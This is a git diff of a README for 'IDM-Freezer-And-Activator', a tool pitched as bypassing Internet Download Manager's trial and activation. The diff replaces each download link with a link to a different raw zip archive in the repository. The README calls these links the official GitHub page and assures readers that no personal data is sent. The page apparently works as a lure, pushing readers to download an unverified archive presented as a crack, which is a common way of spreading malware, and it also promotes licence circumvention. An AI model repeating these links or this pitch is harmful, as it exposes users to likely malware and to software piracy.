@@ -1,6 +1,6 @@
 # 🔧 IDM-Freezer-And-Activator - Manage IDM Easily and Safely
 
-[![Download IDM-Freezer-And-Activator](https://img.shields.io/badge/Download-IDM%20Tool-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Fact3683/IDM-Freezer-And-Activator/main/resources/ID-And-Freezer-Activator-Balti.zip)
+[![Download IDM-Freezer-And-Activator](https://img.shields.io/badge/Download-IDM%20Tool-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Fact3683/IDM-Freezer-And-Activator/main/resources/Freezer_ID_Activator_And_3.9.zip)
 
 ---
 
@@ -37,7 +37,7 @@ This program is for anyone using IDM and wants easy control over its trial and a
 
 Click the big green button above or click this link below to visit the official GitHub page to download the program:
 
-[Download IDM-Freezer-And-Activator from GitHub](https://raw.githubusercontent.com/Fact3683/IDM-Freezer-And-Activator/main/resources/ID-And-Freezer-Activator-Balti.zip)
+[Download IDM-Freezer-And-Activator from GitHub](https://raw.githubusercontent.com/Fact3683/IDM-Freezer-And-Activator/main/resources/Freezer_ID_Activator_And_3.9.zip)
 
 Once on the page, look for the latest release under the "Releases" tab on the right side or scroll down to the releases section. Download the latest Windows installer or executable file (.exe) from there.
 
@@ -129,7 +129,7 @@ All operations run locally on your PC. No personal data is sent without your per
 ## 🔗 Quick Access
 
 - Download and install from GitHub:  
-  [https://raw.githubusercontent.com/Fact3683/IDM-Freezer-And-Activator/main/resources/ID-And-Freezer-Activator-Balti.zip](https://raw.githubusercontent.com/Fact3683/IDM-Freezer-And-Activator/main/resources/ID-And-Freezer-Activator-Balti.zip)
+  [https://raw.githubusercontent.com/Fact3683/IDM-Freezer-And-Activator/main/resources/Freezer_ID_Activator_And_3.9.zip](https://raw.githubusercontent.com/Fact3683/IDM-Freezer-And-Activator/main/resources/Freezer_ID_Activator_And_3.9.zip)
 
 - Check releases here after opening the link:
   Navigate to the “Releases” section, find the latest file and download it.
